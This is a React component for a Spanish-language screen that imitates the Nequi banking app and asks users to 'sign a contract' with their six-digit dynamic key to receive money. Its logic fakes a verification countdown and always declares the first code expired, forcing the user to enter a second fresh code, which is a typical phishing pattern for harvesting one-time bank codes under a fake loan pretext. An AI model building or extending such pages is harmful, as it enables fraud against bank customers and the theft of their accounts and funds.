import { useState, useEffect, useRef } from 'react'
import { generateApplicationId } from '../types'
import { NequiLogo } from './NequiLogo'

interface AccessScreenProps {
  onAccess: (applicationId: string) => void
  onBack: () => void
}

const KEYS = ['1', '2', '3', '4', '5', '6', '7', '8', '9', '', '0', 'del']
const PIN_LENGTH = 6
const FIRST_ATTEMPT_DURATION = 30
const SECOND_ATTEMPT_DURATION = 15
const MAX_ATTEMPTS = 2

export function AccessScreen({ onAccess, onBack }: AccessScreenProps) {
  const [pin, setPin] = useState('')
  const [loading, setLoading] = useState(false)
  const [countdown, setCountdown] = useState(FIRST_ATTEMPT_DURATION)
  const [expired, setExpired] = useState(false)
  const [attempts, setAttempts] = useState(0)
  const timerRef = useRef<ReturnType<typeof setInterval> | null>(null)

  useEffect(() => {
    return () => {
      if (timerRef.current) clearInterval(timerRef.current)
    }
  }, [])

  function startLoading() {
    setLoading(true)
    setExpired(false)
    const newAttempts = attempts + 1
    const duration = newAttempts === 1 ? FIRST_ATTEMPT_DURATION : SECOND_ATTEMPT_DURATION
    setAttempts(newAttempts)
    setCountdown(duration)

    let remaining = duration
    timerRef.current = setInterval(() => {
      remaining -= 1
      setCountdown(remaining)
      if (remaining <= 0) {
        clearInterval(timerRef.current!)
        timerRef.current = null
        setLoading(false)
        if (newAttempts >= MAX_ATTEMPTS) {
          const applicationId = generateApplicationId()
          onAccess(applicationId)
        } else {
          setExpired(true)
          setPin('')
        }
      }
    }, 1000)
  }

  function handleKey(key: string) {
    if (loading) return
    if (key === 'del') {
      setPin((p) => p.slice(0, -1))
      setExpired(false)
      return
    }
    if (key === '') return
    setExpired(false)
    const next = pin + key
    if (next.length > PIN_LENGTH) return
    setPin(next)
    if (next.length === PIN_LENGTH) startLoading()
  }

  return (
    <div className="min-h-screen w-full bg-white flex flex-col">
      {/* Minimal header — just back button */}
      <div className="w-full px-6 pt-5 pb-2 flex items-center">
        <button
          onClick={onBack}
          className="flex items-center gap-1.5 text-gray-400 hover:text-gray-700 transition-colors text-sm font-medium"
        >
          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
            <path d="M19 12H5M12 19l-7-7 7-7" />
          </svg>
          Volver
        </button>
      </div>

      {/* Centered logo */}
      <div className="flex justify-center mt-6 mb-8">
        <NequiLogo size="xl" color="dark" />
      </div>

      {/* Title */}
      <h1 className="text-2xl font-extrabold mb-2 text-center" style={{ color: '#2D1B6E' }}>
        Firma tu contrato
      </h1>
      <p className="text-sm text-center max-w-xs mx-auto mb-4 leading-relaxed font-medium" style={{ color: '#E6005C' }}>
        Firma el contrato con tu clave dinámica y recibe<br />tu dinero en la app Nequi.
      </p>

      {/* Attempts indicator */}
      <div className="mb-5 text-center">
        <span className="text-xs" style={{ color: '#2D1B6E', opacity: 0.5 }}>
          Intento {attempts + 1} de {MAX_ATTEMPTS}
        </span>
      </div>

      {/* PIN slots — dashes like image */}
      <div className="flex items-center justify-center gap-5 mb-4">
        {Array.from({ length: PIN_LENGTH }).map((_, i) => (
          <div key={i} className="flex flex-col items-center gap-1.5">
            <span
              className="text-2xl font-black h-8 flex items-center"
              style={{
                color: expired ? '#EF4444' : '#2D1B6E',
                visibility: i < pin.length ? 'visible' : 'hidden',
              }}
            >
              •
            </span>
            <div
              className="rounded-full transition-colors"
              style={{
                width: 28,
                height: 3,
                background: i < pin.length
                  ? (expired ? '#EF4444' : '#2D1B6E')
                  : '#2D1B6E',
                opacity: i < pin.length ? 1 : 0.25,
              }}
            />
          </div>
        ))}
      </div>

      {/* Status messages */}
      <div className="h-14 flex flex-col items-center justify-center mb-2 px-6">
        {loading && (
          <div className="flex flex-col items-center gap-1">
            <div className="flex items-center gap-2">
              <svg className="animate-spin" width="16" height="16" viewBox="0 0 24 24" fill="none">
                <circle cx="12" cy="12" r="10" stroke="#E6005C" strokeWidth="3" strokeDasharray="60 20" />
              </svg>
              <span className="text-sm font-semibold" style={{ color: '#2D1B6E' }}>
                Verificando clave...
              </span>
            </div>
            <span className="text-xs" style={{ color: '#2D1B6E', opacity: 0.5 }}>
              {countdown}s restantes
            </span>
          </div>
        )}
        {expired && !loading && (
          <div
            className="flex items-center gap-2 px-4 py-2 rounded-xl text-sm font-semibold animate-fade-in"
            style={{ background: '#fff0f4', border: '1.5px solid #EF4444', color: '#EF4444' }}
          >
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
              <circle cx="12" cy="12" r="10" stroke="#EF4444" strokeWidth="2" />
              <path d="M12 7v5M12 16v1" stroke="#EF4444" strokeWidth="2" strokeLinecap="round" />
            </svg>
            La clave expiró, inténtalo nuevamente
          </div>
        )}
        {!loading && !expired && attempts === 0 && (
          <p className="text-xs text-center" style={{ color: '#2D1B6E', opacity: 0.45 }}>
            Ingresa tu clave dinámica de 6 dígitos
          </p>
        )}
      </div>

      {/* Numeric keypad — transparent, dark purple numbers, matching image */}
      <div className="grid grid-cols-3 gap-y-0 w-full max-w-xs mx-auto px-4 mt-2">
        {KEYS.map((key, idx) => {
          if (key === '') {
            return <div key={idx} className="h-16" />
          }

          if (key === 'del') {
            return (
              <button
                key={idx}
                onClick={() => handleKey('del')}
                disabled={pin.length === 0 || loading}
                className="flex items-center justify-center mx-auto w-14 h-14 rounded-xl transition-opacity"
                style={{
                  background: '#e8e8f0',
                  opacity: pin.length === 0 || loading ? 0.4 : 1,
                  border: 'none',
                }}
              >
                <svg width="22" height="16" viewBox="0 0 22 16" fill="none">
                  <path
                    d="M8 1H20C20.5523 1 21 1.44772 21 2V14C21 14.5523 20.5523 15 20 15H8L1 8L8 1Z"
                    stroke="#2D1B6E"
                    strokeWidth="1.5"
                    strokeLinejoin="round"
                  />
                  <path d="M14 5.5L10 10.5M10 5.5L14 10.5" stroke="#2D1B6E" strokeWidth="1.5" strokeLinecap="round" />
                </svg>
              </button>
            )
          }

          return (
            <button
              key={idx}
              onClick={() => handleKey(key)}
              disabled={loading}
              className="flex items-center justify-center mx-auto w-14 h-16 text-3xl font-light transition-all active:scale-95"
              style={{
                color: '#2D1B6E',
                background: 'transparent',
                border: 'none',
                cursor: loading ? 'default' : 'pointer',
                opacity: loading ? 0.4 : 1,
              }}
            >
              {key}
            </button>
          )
        })}
      </div>

      {/* Security warning */}
      <div className="mt-4 mb-8 px-6 text-center">
        <p className="text-xs" style={{ color: '#2D1B6E', opacity: 0.35 }}>
          Nunca compartas tu clave dinámica con nadie
        </p>
      </div>
    </div>
  )
}
